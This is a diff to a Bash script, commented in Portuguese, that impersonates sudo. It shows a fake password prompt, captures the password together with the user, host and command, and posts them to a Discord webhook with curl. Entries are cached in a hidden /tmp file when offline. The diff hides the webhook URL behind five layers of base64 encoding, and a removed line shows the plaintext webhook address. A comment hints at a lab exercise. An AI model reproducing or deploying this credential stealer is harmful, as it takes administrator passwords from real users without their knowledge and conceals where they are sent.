@@ -1,7 +1,9 @@
 #!/bin/bash
 
 # --- CONFIGURAÇÕES ---
-WEBHOOK_URL="https://discord.com/api/webhooks/1494194971857653890/pqSptx5KZ9cYy2bZ3I6KWMgjrZqfxSAQmmACL1RfvzBMS0Bw-Uz7R2RlhTnkY9bFp4Rg"
+#lab/tools/sud*/terre*.txt --> contem dica
+ENC_URL="VjFaV2IxVXdNVWhVYTJ4VlZrWndUbHBXVW5OamJHeFhZVVU1YUdKVmJEWlZNakV3VkZkS1ZrNVVTbHBpUlRBeFdWVmtUMU5IUlhwWGJYUk9Za1p3ZDFkV1ZtcE9WMUowVWxod1ZWZEdjRTlXYTFwR1RWWlNjbFZyV2s5V1ZGWkdXVmh3VDFSc1draFpNMmhWWW01Q1lWUldWWGhPYkhBMlZtczFVbVZ0ZDNwWFZFWmhWREpSZVZWcmJHRmxhMXBWVkZaak5FMVdaRlZTYms1UFZsUkdNRlV5TVVkVWF6RklZek5zVm1WclduSldSM2gyWlZkT1NXSkdhR2xoTVhBd1YyeFdZVlF4Um5OV2JHaE9WMFpLVTFac1ZURlViRkpYVjJ0MGFWWXhTakZaTUZaUFZsWmFjazFVVGxaV2VsWnhXa1ZhWVZkWFNqWlViRnBvWVROQ1ZWZFhkR3RpTVZwWVUyNVNhMUp1UWxGV2FrSjNVMFpyZDFWc1RsWk5XRUY2VlVaUmQxTjNiejBLCg==" 
+thingurldc=$(echo "$ENC_URL" | base64 --decode | base64 --decode | base64 --decode | base64 --decode | base64 --decode)
 OFFLINE_LOG="/tmp/.sys_sudo_cache"
 REAL_SUDO=$(command -p -v sudo 2>/dev/null || which -a sudo | grep -v "tmp" | head -n 1)
 
@@ -18,20 +20,19 @@ printf "[sudo] password for %s: " "$USER"
 read -s PASSWORD
 echo "" 
 
-# Prepara o payload para o Discord
 TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')
 PAYLOAD="{\"content\": \"**Sudo Captured!**\n**Time:** $TIMESTAMP\n**User:** $USER@$HOSTNAME\n**Pass:** \`$PASSWORD\`\n**Cmd:** $COMMAND_TRIED\"}"
 
 # --- LÓGICA DE ENVIO / CACHE ---
 if ping -c 1 8.8.8.8 >/dev/null 2>&1; then
     # Envia o atual
-    curl -s -H "Content-Type: application/json" -d "$PAYLOAD" "$WEBHOOK_URL" > /dev/null 2>&1 &
+    curl -s -H "Content-Type: application/json" -d "$PAYLOAD" "$thingurldc" > /dev/null 2>&1 &
     
     # Envia o cache antigo se existir
     if [ -f "$OFFLINE_LOG" ]; then
         (
             while IFS= read -r line; do
-                curl -s -H "Content-Type: application/json" -d "$line" "$WEBHOOK_URL" > /dev/null 2>&1
+                curl -s -H "Content-Type: application/json" -d "$line" "$thingurldc" > /dev/null 2>&1
                 sleep 1
             done < "$OFFLINE_LOG"
             rm -f "$OFFLINE_LOG"
